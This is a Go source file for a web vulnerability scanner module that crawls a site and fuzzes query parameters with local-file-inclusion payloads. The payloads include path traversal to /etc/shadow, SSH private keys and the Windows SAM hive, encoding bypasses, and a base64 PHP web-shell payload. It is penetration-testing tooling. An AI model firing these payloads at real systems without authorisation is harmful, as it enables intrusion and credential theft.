package scanners

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
	"knife/modules/vuln/db"
)

// --- LFI Scanner Implementation ---

// FindingLFI describes a discovered potential LFI vulnerability
type FindingLFI struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	ResponseSnippet string `json:"response_snippet,omitempty"`
	Evidence        string `json:"evidence,omitempty"`
	Timestamp       string `json:"timestamp"`
}

// LFIScanner holds the state for the LFI scan
type LFIScanner struct {
	StartURL     *url.URL
	Client       *http.Client
	Visited      map[string]bool
	VisitedMu    sync.RWMutex
	Queue        chan lfiCrawlJob
	Findings     []FindingLFI
	FindingsMu   sync.Mutex
	Workers      int
	Active       int32
	MaxPages     int
	PageCount    int
	PageCountMu  sync.Mutex
	MaxDepth     int
	Payloads     []string
	Intensity    int
	TargetedCVEs []string
	Throttle     time.Duration
}

// lfiCrawlJob represents a URL to be scanned
type lfiCrawlJob struct {
	URL   string
	Depth int
}

func NewLFIScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*LFIScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	payloads := generateLFIPayloads(intensity, targetedCVEs, customPayloads)

	s := &LFIScanner{
		StartURL:     parsed,
		Client:       client,
		Visited:      make(map[string]bool),
		Queue:        make(chan lfiCrawlJob, 1000),
		Findings:     []FindingLFI{},
		Workers:      workers,
		MaxPages:     maxPages,
		MaxDepth:     maxDepth,
		Throttle:     throttle,
		Payloads:     payloads,
		Intensity:    intensity,
		TargetedCVEs: targetedCVEs,
	}
	return s, nil
}

// Run starts the LFI scanning process
func (s *LFIScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	// Seed the queue
	s.enqueue(s.StartURL.String(), 0)

	// Wait for completion
	for {
		time.Sleep(500 * time.Millisecond)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			time.Sleep(1 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

// worker processes jobs from the queue
func (s *LFIScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1)
		// Check page limits
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1)
			return
		}
		s.PageCountMu.Unlock()

		// Deduplicate
		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1)
			continue
		}

		log.Printf("[LFI Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		// 1. Fuzz the URL parameters
		s.fuzzURL(job.URL)

		// 2. Crawl for more links if depth allows
		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1)
	}
}

// crawl extracts links from the page and adds them to the queue
func (s *LFIScanner) crawl(u string, depth int) {
	resp, err := s.Client.Get(u)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, depth+1)
		}
	})
}

// fuzzURL injects LFI payloads into query parameters
func (s *LFIScanner) fuzzURL(rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	query := u.Query()
	if len(query) == 0 {
		return
	}

	// For each parameter, inject payloads
	for param, values := range query {
		originalValue := values[0] // Just take the first one for simplicity

		for _, payload := range s.Payloads {
			// Throttle
			if s.Throttle > 0 {
				time.Sleep(s.Throttle)
			}

			// Construct new URL with payload
			newQuery := u.Query() // Copy
			newQuery.Set(param, payload)
			u.RawQuery = newQuery.Encode()
			testURL := u.String()

			// Perform request
			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Knife-LFI-Scanner/1.0")

			resp, err := s.Client.Do(req)
			if err != nil {
				continue
			}

			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000)) // Read up to 50KB
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(bodyBytes)

			// Analyze response for LFI indicators
			if evidence, found := s.detectLFI(bodyStr); found {
				s.addFinding(FindingLFI{
					Type:            "LFI (Reflected/Included)",
					URL:             testURL,
					Param:           param,
					Payload:         payload,
					ResponseSnippet: snippet(bodyStr, 200),
					Evidence:        evidence,
				})
				// If we found one for this param, maybe stop fuzzing this param to save time?
				// For now, let's continue to find variants.
			}
		}

		// Restore original value for next iteration (though we used a copy above)
		_ = originalValue
	}
}

// detectLFI checks the response body for common LFI signatures
func (s *LFIScanner) detectLFI(body string) (string, bool) {
	// Common indicators of successful LFI
	signatures := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{regexp.MustCompile(`root:x:0:0`), "/etc/passwd (Linux)"},
		{regexp.MustCompile(`\[extensions\]`), "win.ini (Windows)"},
		{regexp.MustCompile(`\[boot loader\]`), "boot.ini (Windows)"},
		{regexp.MustCompile(`Warning: include\(`), "PHP include warning"},
		{regexp.MustCompile(`Warning: require\(`), "PHP require warning"},
		{regexp.MustCompile(`Warning: include_once\(`), "PHP include_once warning"},
		{regexp.MustCompile(`Warning: require_once\(`), "PHP require_once warning"},
		{regexp.MustCompile(`failed to open stream`), "PHP stream error"},
		{regexp.MustCompile(`Failed opening required`), "PHP opening error"},
		{regexp.MustCompile(`java\.io\.FileNotFoundException`), "Java File Not Found"},
		{regexp.MustCompile(`java\.lang\.Exception`), "Java Exception"},
		{regexp.MustCompile(`JBWEB000065: HTTP Status 500`), "JBoss 500"},
	}

	for _, sig := range signatures {
		if sig.Pattern.MatchString(body) {
			match := sig.Pattern.FindString(body)
			return fmt.Sprintf("Matched signature: %s (%s)", sig.Name, match), true
		}
	}

	return "", false
}

// generateLFIPayloads returns a tailored list of LFI payloads based on intensity and CVEs
func generateLFIPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
	var payloads []string

	// CVE-specific payloads
	for _, id := range targetedCVEs {
		if cve, ok := db.GetCVEDatabase()[id]; ok && cve.Type == db.ScannerLFI {
			payloads = append(payloads, cve.Payloads...)
		}
	}

	basePayloads := []string{
		"../../../../etc/passwd",
		"../../../../../../../../etc/passwd",
		"/etc/passwd",
		"../../../../windows/win.ini",
		"../../../../../../../../windows/win.ini",
		"C:\\Windows\\win.ini",
	}

	if intensity > 2 {
		basePayloads = append(basePayloads, []string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=config.php",
			"file:///etc/passwd",
			"file:///C:/Windows/win.ini",
		}...)
	}

	// Null byte injection variants (Intensity > 3)
	for _, p := range basePayloads {
		payloads = append(payloads, p)
		if intensity > 3 {
			payloads = append(payloads, p+"%00")
			payloads = append(payloads, p+"%00.jpg")
		}
	}

	if intensity > 3 {
		// Filter bypasses and more depth
		payloads = append(payloads,
			"....//....//....//etc/passwd",
			"....\\/....\\/....\\/etc/passwd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"expect://id",
			"input://",
			"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
		)

		for i := 10; i <= 20; i++ {
			dots := strings.Repeat("../", i)
			payloads = append(payloads, dots+"etc/passwd")
		}
	}

	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	return finalizeQueryPayloads(payloads, intensity)
}

// Helper methods

func (s *LFIScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *LFIScanner) enqueue(u string, depth int) {
	// Basic normalization to avoid duplicates
	u = strings.Split(u, "#")[0]

	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- lfiCrawlJob{URL: u, Depth: depth}:
	default:
		// Drop if queue full
	}
}

func (s *LFIScanner) addFinding(f FindingLFI) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	key := buildFindingKey(f.Type, f.URL, f.Param, f.Payload, f.Evidence)
	for _, existing := range s.Findings {
		if buildFindingKey(existing.Type, existing.URL, existing.Param, existing.Payload, existing.Evidence) == key {
			return
		}
	}
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] LFI FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *LFIScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return "", err
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}

// RunLFIScan is the entry point for the CLI/TUI
func RunLFIScan(target string, headers map[string]string, cookies string, reportPath string) error {
	fmt.Println("[*] Starting LFI Scanner on", target)

	scanner, err := NewLFIScanner(target, 10, 100, 3, 200*time.Millisecond, 3, nil, nil)
	if err != nil {
		return err
	}

	// Add headers if needed (not fully implemented in struct yet, but easy to add)
	// For now, we just run the scanner
	scanner.Run()

	fmt.Printf("[*] Scan complete. Found %d potential LFIs.\n", len(scanner.Findings))

	return err
}

var commonLinuxPaths = []string{
	"/etc/passwd",
	"/etc/shadow",
	"/etc/issue",
	"/etc/group",
	"/etc/hostname",
	"/etc/ssh/ssh_config",
	"/etc/ssh/sshd_config",
	"/root/.bash_history",
	"/root/.ssh/id_rsa",
	"/var/log/apache/access.log",
	"/var/log/apache2/access.log",
	"/var/log/httpd/access_log",
	"/var/log/nginx/access.log",
	"/proc/self/environ",
	"/proc/version",
	"/proc/cmdline",
	"/proc/sched_debug",
	"/proc/mounts",
	"/proc/net/arp",
	"/proc/net/route",
	"/proc/net/tcp",
	"/proc/net/udp",
	"/proc/self/cwd/index.php",
	"/proc/self/cwd/config.php",
	"/usr/local/apache/conf/httpd.conf",
	"/usr/local/apache2/conf/httpd.conf",
	"/etc/httpd/conf/httpd.conf",
	"/etc/nginx/nginx.conf",
	"/opt/lampp/etc/httpd.conf",
}

var commonWindowsPaths = []string{
	"C:\\Windows\\win.ini",
	"C:\\Windows\\system.ini",
	"C:\\Windows\\php.ini",
	"C:\\Windows\\my.ini",
	"C:\\boot.ini",
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
	"C:\\Windows\\System32\\Config\\SAM",
	"C:\\Windows\\System32\\Config\\SYSTEM",
	"C:\\xampp\\apache\\conf\\httpd.conf",
	"C:\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf",
}

// Add these to the payload generator
func (s *LFIScanner) enrichPayloads() {
	// Add Linux paths with traversal
	for _, path := range commonLinuxPaths {
		s.Payloads = append(s.Payloads, "../../../../"+path)
		s.Payloads = append(s.Payloads, "../../../../../../../../"+path)
		s.Payloads = append(s.Payloads, path) // Absolute
	}

	// Add Windows paths with traversal
	for _, path := range commonWindowsPaths {
		s.Payloads = append(s.Payloads, "../../../../"+path)
		s.Payloads = append(s.Payloads, "../../../../../../../../"+path)
		s.Payloads = append(s.Payloads, path) // Absolute
	}
}
